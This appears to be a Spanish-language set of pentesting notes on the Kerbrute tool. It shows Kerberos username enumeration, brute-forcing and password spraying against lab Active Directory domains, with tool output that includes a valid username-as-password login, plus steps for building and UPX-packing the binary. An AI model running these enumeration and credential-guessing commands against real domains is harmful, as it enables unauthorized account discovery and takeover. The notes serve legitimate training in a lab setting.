``` shell
kerbrute userenum -d scrm.local --dc dc1.scrm.local users       

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 12/21/25 - Ronnie Flathers @ropnop

2025/12/21 18:19:17 >  Using KDC(s):
2025/12/21 18:19:17 >   dc1.scrm.local:88

2025/12/21 18:19:17 >  [+] VALID USERNAME:       ksimpson@scrm.local
2025/12/21 18:19:17 >  Done! Tested 3 usernames (1 valid) in 0.178 seconds
```


``` shell
cat users      
support
ksimpson
VbScrub
```

# Probar credenciales

```shell
kerbrute bruteuser -d scrm.local --dc dc1.scrm.local users ksimpson

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 12/27/25 - Ronnie Flathers @ropnop

2025/12/27 00:07:47 >  Using KDC(s):
2025/12/27 00:07:47 >   dc1.scrm.local:88

2025/12/27 00:07:47 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2025/12/27 00:07:47 >  Done! Tested 4 logins (1 successes) in 0.698 seconds

```

```shell
kerbrute passwordspray -d scrm.local --dc dc1.scrm.local users ksimpson

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 12/27/25 - Ronnie Flathers @ropnop

2025/12/27 00:08:12 >  Using KDC(s):
2025/12/27 00:08:12 >   dc1.scrm.local:88

2025/12/27 00:08:12 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2025/12/27 00:08:12 >  Done! Tested 4 logins (1 successes) in 0.548 seconds

```


# Kerbrute (Usuarios Validos)

A tool to quickly bruteforce and enumerate valid Active Directory accounts throrrugh Kerberos Pre-Authentication

{% embed url="<https://github.com/ropnop/kerbrute>" %}

## Install

Compilar el GO (Ejemplo kerbrute)

Copy

```
git clone https://github.com/ropnop/kerbrute
Cloning into 'kerbrute'...
remote: Enumerating objects: 845, done.
remote: Counting objects: 100% (81/81), done.
remote: Compressing objects: 100% (22/22), done.
remote: Total 845 (delta 65), reused 59 (delta 59), pack-reused 764 (from 1)
Receiving objects: 100% (845/845), 411.84 KiB | 1.29 MiB/s, done.
Resolving deltas: 100% (383/383), done.
```

Las flags de "-s -w" son para reducir el peso del binario

Copy

```
go build -ldflags "-s -w" .                 
go: downloading github.com/ropnop/gokrb5/v8 v8.0.0-20201111231119-729746023c02
go: downloading github.com/spf13/cobra v1.1.1
go: downloading github.com/jcmturner/dnsutils/v2 v2.0.0
go: downloading github.com/hashicorp/go-uuid v1.0.2
go: downloading golang.org/x/crypto v0.0.0-20201016220609-9e8e0b390897
go: downloading github.com/jcmturner/rpc/v2 v2.0.2
go: downloading github.com/jcmturner/aescts/v2 v2.0.0
go: downloading golang.org/x/net v0.0.0-20200114155413-6afb5195e5aa
```

Copy

```
ls
cmd  go.mod  go.sum  kerbrute  LICENSE  main.go  Makefile  README.md  session  util
```

Para validar el peso de un archivo en linux podemos hacerlo con el siguiente comando

Copy

```
du -hc kerbrute     
5.7M    kerbrute
5.7M    total
```

Con \`upx\` podemos disminuir el peso del binario

Copy

```
upx kerbrute 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.4       Markus Oberhumer, Laszlo Molnar & John Reiser    May 9th 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   5873924 ->   2273848   38.71%   linux/amd64   kerbrute                      

Packed 1 file.
                                                                                                                                                                                                   
┌──(root㉿kali)-[~/…/Manager/nmap/kerbrute/kerbrute]
└─# du -hc kerbrute
2.2M    kerbrute
2.2M    total
```

## Enumerar usuarios

```bash
kerbrute userenum --dc 10.10.11.236 -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/11/24 - Ronnie Flathers @ropnop

2024/11/11 22:59:54 >  Using KDC(s):
2024/11/11 22:59:54 >   10.10.11.236:88

2024/11/11 22:59:58 >  [+] VALID USERNAME:       ryan@manager.htb
2024/11/11 23:00:05 >  [+] VALID USERNAME:       guest@manager.htb
2024/11/11 23:00:08 >  [+] VALID USERNAME:       cheng@manager.htb
2024/11/11 23:00:11 >  [+] VALID USERNAME:       raven@manager.htb
2024/11/11 23:00:28 >  [+] VALID USERNAME:       administrator@manager.htb
2024/11/11 23:01:08 >  [+] VALID USERNAME:       Ryan@manager.htb
2024/11/11 23:01:13 >  [+] VALID USERNAME:       Raven@manager.htb
2024/11/11 23:01:33 >  [+] VALID USERNAME:       operator@manager.htb
2024/11/11 23:04:16 >  [+] VALID USERNAME:       Guest@manager.htb
2024/11/11 23:04:17 >  [+] VALID USERNAME:       Administrator@manager.htb

```

# Lista de usuarios 

https://github.com/attackdebris/kerberos_enum_userlists
